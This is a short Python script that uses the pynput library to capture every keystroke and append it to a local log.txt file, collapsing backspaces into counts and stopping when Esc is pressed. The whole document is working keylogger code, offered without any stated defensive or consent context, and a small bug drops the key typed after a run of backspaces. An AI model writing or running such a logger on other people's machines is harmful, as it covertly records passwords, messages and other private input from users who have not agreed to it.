from pynput.keyboard import Key, Listener

# sentence = []
# string = ""
count = 0
def ON_PRESS(key):
    global sentence
    global count
    
    if key == Key.backspace: count+=1
    elif count!=0:
        with open("log.txt", "a") as f: f.write(str(count) + ' * Backspaces')
        count = 0
    else: 
        if key == Key.space: 
            with open("log.txt", "a") as f: f.write(" ")
        elif key == Key.enter: 
            with open("log.txt", "a") as f: f.write("\n")
            # sentence.append("\n")
        else: 
            with open("log.txt", "a") as f:
                f.write(str(key).replace("'",''))
            # sentence.append(str(key))
        
def ON_RELEASE(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=ON_PRESS, on_release=ON_RELEASE) as listner:
    listner.join()